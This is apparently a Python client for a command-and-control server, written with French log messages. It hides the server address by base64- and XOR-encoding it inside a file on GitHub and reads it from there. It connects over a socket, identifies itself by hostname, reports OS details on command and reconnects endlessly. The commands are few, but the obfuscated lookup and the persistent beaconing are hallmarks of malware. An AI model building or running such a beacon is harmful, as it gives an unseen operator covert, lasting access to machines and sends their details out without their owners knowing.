import socket
import json
import time
import platform
import base64
import requests

# =============================
# CONFIG
# =============================

GITHUB_RAW_URL = "https://raw.githubusercontent.com/TON_USER/TON_REPO/main/config.txt"
XOR_KEY = "Xa1om"
CLIENT_ID = platform.node()
RECONNECT_DELAY = 5

# =============================
# CRYPTO
# =============================

def xor_decrypt(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    return bytes(
        data[i] ^ key_bytes[i % len(key_bytes)]
        for i in range(len(data))
    )

def decrypt_address(enc: str) -> (str, int):
    raw = base64.b64decode(enc)
    decrypted = xor_decrypt(raw, XOR_KEY)
    host, port = decrypted.decode().split(":")
    return host, int(port)

# =============================
# FETCH CONFIG
# =============================

def fetch_server_address():
    r = requests.get(GITHUB_RAW_URL, timeout=5)
    r.raise_for_status()
    return decrypt_address(r.text.strip())

# =============================
# ACTIONS
# =============================

def handle_command(action):
    if action == "ping":
        return "pong"

    if action == "get_info":
        return {
            "os": platform.system(),
            "release": platform.release(),
            "machine": platform.machine()
        }

    return "action_not_allowed"

# =============================
# CLIENT LOOP
# =============================

def run():
    while True:
        try:
            host, port = fetch_server_address()
            print(f"[INFO] Connexion à {host}:{port}")

            sock = socket.socket()
            sock.connect((host, port))

            # AUTH
            sock.sendall((json.dumps({
                "type": "auth",
                "role": "client",
                "client_id": CLIENT_ID
            }) + "\n").encode())

            buffer = ""
            print("[INFO] Connecté au serveur")

            while True:
                data = sock.recv(4096)
                if not data:
                    raise ConnectionError()

                buffer += data.decode()
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)
                    msg = json.loads(line)

                    if msg["type"] == "command":
                        action = msg["action"]
                        result = handle_command(action)

                        sock.sendall((json.dumps({
                            "type": "command_result",
                            "action": action,
                            "result": result
                        }) + "\n").encode())

        except Exception as e:
            print("[ERROR] Déconnecté :", e)
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    run()
